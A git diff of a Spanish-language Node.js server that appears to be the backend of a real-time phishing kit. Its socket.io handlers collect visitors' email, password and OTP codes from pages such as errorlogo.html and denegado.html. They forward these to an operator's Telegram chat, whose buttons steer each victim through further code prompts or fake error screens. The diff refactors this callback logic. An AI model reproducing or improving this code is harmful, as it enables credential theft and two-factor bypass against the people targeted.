@@ -70,16 +70,16 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // Cuando se envía OTP desde denegado.html
+  // Cuando se reintenta desde denegado.html
   socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `📨 El usuario volvió a ingresar un OTP:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `📨 Reintento desde pantalla de error:\n\n🧾 Nuevo código OTP: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` },
+            { text: '✅ Finalizar', callback_data: `otpFinalizar_${sessionId}` },
             { text: '❌ Error de OTP', callback_data: `otpError_${sessionId}` }
           ]
         ]
@@ -89,7 +89,7 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // Cuando se envía el formulario desde errorlogo.html
+  // Desde errorlogo.html
   socket.on('errorlogoForm', ({ correo, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
@@ -117,69 +117,43 @@ bot.on('callback_query', (query) => {
 
   bot.answerCallbackQuery(callbackId);
 
-  // Manejo de botones de acceso
+  const sessionId = data.split('_')[1];
+  const socket = activeSockets.get(sessionId);
+
+  if (!socket) {
+    bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
+    return;
+  }
+
+  // Desde index.html
   if (data.startsWith('aprobado_') || data.startsWith('rechazado_')) {
-    const sessionId = data.split('_')[1];
-    const socket = activeSockets.get(sessionId);
-
-    if (socket) {
-      const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
-      socket.emit('respuesta', decision);
-      bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
-    } else {
-      bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
-    }
-
-    activeSockets.delete(sessionId);
+    const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
+    socket.emit('respuesta', decision);
+    bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
   }
 
-  // Botones tras código en bienvenido.html
+  // Desde bienvenido.html
   else if (data.startsWith('error_') || data.startsWith('finalizar_')) {
-    const sessionId = data.split('_')[1];
-    const socket = activeSockets.get(sessionId);
-
-    if (socket) {
-      const decision = data.startsWith('error_') ? 'error' : 'finalizar';
-      socket.emit('respuestaCodigo', decision);
-      bot.sendMessage(chatId, decision === 'error' ? '⚠️ Código incorrecto.' : '✅ Finalizando proceso...');
-    } else {
-      bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
-    }
-
-    activeSockets.delete(sessionId);
+    const decision = data.startsWith('error_') ? 'error' : 'finalizar';
+    socket.emit('respuestaCodigo', decision);
+    bot.sendMessage(chatId, decision === 'error' ? '⚠️ Código incorrecto.' : '✅ Finalizando proceso...');
   }
 
-  // Botones tras OTP en denegado.html
-  else if (data.startsWith('finalizar_') || data.startsWith('otpError_')) {
-    const sessionId = data.split('_')[1];
-    const socket = activeSockets.get(sessionId);
-
-    if (socket) {
-      const decision = data.startsWith('finalizar_') ? 'finalizar' : 'otp_error';
-      socket.emit('respuestaOtp', decision);
-      bot.sendMessage(chatId, decision === 'finalizar' ? '✅ Proceso finalizado.' : '❌ Código OTP inválido nuevamente.');
-    } else {
-      bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
-    }
-
-    activeSockets.delete(sessionId);
+  // Desde denegado.html (reintento OTP)
+  else if (data.startsWith('otpFinalizar_') || data.startsWith('otpError_')) {
+    const decision = data.startsWith('otpFinalizar_') ? 'finalizar' : 'otp_error';
+    socket.emit('respuestaOtp', decision);
+    bot.sendMessage(chatId, decision === 'finalizar' ? '✅ Proceso finalizado.' : '❌ Código OTP inválido nuevamente.');
   }
 
-  // Botones tras envío desde errorlogo.html
+  // Desde errorlogo.html
   else if (data.startsWith('otp_') || data.startsWith('errorlogo_')) {
-    const sessionId = data.split('_')[1];
-    const socket = activeSockets.get(sessionId);
-
-    if (socket) {
-      const decision = data.startsWith('otp_') ? 'otp' : 'error_logo';
-      socket.emit('respuestaErrorLogo', decision);
-      bot.sendMessage(chatId, decision === 'otp' ? '📲 Redirigiendo a ingreso de código.' : '🚫 Error logo, reenviando.');
-    } else {
-      bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
-    }
-
-    activeSockets.delete(sessionId);
+    const decision = data.startsWith('otp_') ? 'otp' : 'error_logo';
+    socket.emit('respuestaErrorLogo', decision);
+    bot.sendMessage(chatId, decision === 'otp' ? '📲 Redirigiendo a ingreso de código.' : '🚫 Error logo, reenviando.');
   }
+
+  activeSockets.delete(sessionId);
 });
 
 const PORT = process.env.PORT || 3000;
